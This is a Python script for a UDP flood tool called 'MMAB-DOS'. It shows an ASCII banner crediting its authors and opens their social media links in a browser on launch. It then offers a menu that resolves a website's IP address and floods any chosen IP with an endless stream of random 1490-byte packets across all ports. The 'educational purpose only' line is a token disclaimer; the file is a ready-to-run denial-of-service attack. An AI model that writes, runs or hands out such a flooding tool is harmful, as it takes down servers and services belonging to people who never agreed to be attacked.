import os 
import socket 
import random 
import sys 
import webbrowser 
 
def show_logo(): 
    print(""" 
  __  __ __  __          ____        _____  _____   ____   _____ 
 |  \/  |  \/  |   /\   |  _ \      |  __ \|  __ \ / __ \ / ____| 
 | \  / | \  / |  /  \  | |_) |_____| |  | | |  | | |  | | (___ 
 | |\/| | |\/| | / /\ \ |  _ <______| |  | | |  | | |  | |\___ \ 
 | |  | | |  | |/ ____ \| |_) |     | |__| | |__| | |__| |____) | 
 |_|  |_|_|  |_/_/    \_\____/      |_____/|_____/ \____/|_____/ 
=============================================================== 
 [✓] Owner     : Dhul-Qarnayn 
 [✓] Facebook  : Dhul-Qarnayn 
 [✓] Team      : Mus'adul Mahdi Ansarullah - MMAB 
 [✓] Region    : Bangladesh 
 [✓] Tool Name : MMAB-DOS 
 [✓] Powered by: Ibn Tawhid 
 [✓] Tool Status: Paid 
 👉 Use educational purpose only... 
=============================================================== 
""") 
 
def open_links(): 
    try: 
        webbrowser.open("https://www.facebook.com/ahmedzariribntawhid") 
        webbrowser.open("https://www.t.me/IbnTawhidMMA") 
    except Exception as e: 
        print(f"[!] Error opening links: {e}") 
 
def ddos_attack(target_ip): 
    try: 
        socket.inet_aton(target_ip) 
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
        byte_data = random._urandom(1490) 
        sent = 1 
        ports = 1 
        try: 
            while True: 
                sock.sendto(byte_data, (target_ip, ports)) 
                sent += 1 
                ports += 1 
                print(f"Sent {sent} packet(s) to {target_ip} through port {ports}") 
                if ports == 65535: 
                    ports = 1 
        except KeyboardInterrupt: 
            print("\n[!] Attack stopped by user.") 
        except OSError as e: 
            print(f"[!] Network error: {e}") 
        finally: 
            sock.close() 
    except socket.error: 
        print(f"[!] Invalid IP address: {target_ip}") 
 
def find_website_ip(): 
    website = input("[•] Enter website (example: google.com) ").strip() 
    if not website: 
        print("[!] Website cannot be empty.") 
        return 
    try: 
        ip_address = socket.gethostbyname(website) 
        print(f"[✓] IP address of {website} is: {ip_address}") 
        choice = input("Do you want to start DDOS on this IP? (y/n): ").lower() 
        if choice == 'y': 
            ddos_attack(ip_address) 
    except socket.gaierror: 
        print("[✗] Could not find IP address. Check the website name.") 
    except Exception as e: 
        print(f"[!] Error: {e}") 
 
def main(): 
    while True: 
        os.system("cls" if os.name == "nt" else "clear") 
        show_logo() 
        print("\n====== MENU ======") 
        print("1. Start DDOS Attack (Manual IP)") 
        print("2. Find Website IP Address to DDOS Attack") 
        print("3. Exit") 
        choice = input("Enter your choice: ").strip() 
 
        if choice == '1': 
            ip = input("Enter Target IP: ").strip() 
            if not ip: 
                print("[!] IP address cannot be empty.") 
                continue 
            ddos_attack(ip) 
        elif choice == '2': 
            find_website_ip() 
        elif choice == '3': 
            print("Exiting...") 
            sys.exit() 
        else: 
            print("Invalid choice! Please try again.") 
 
if __name__ == "__main__": 
    try: 
        open_links() 
        main() 
    except KeyboardInterrupt: 
        print("\n[!] Program stopped by user.") 
    except Exception as e: 
        print(f"[!] Unexpected error: {e}") 
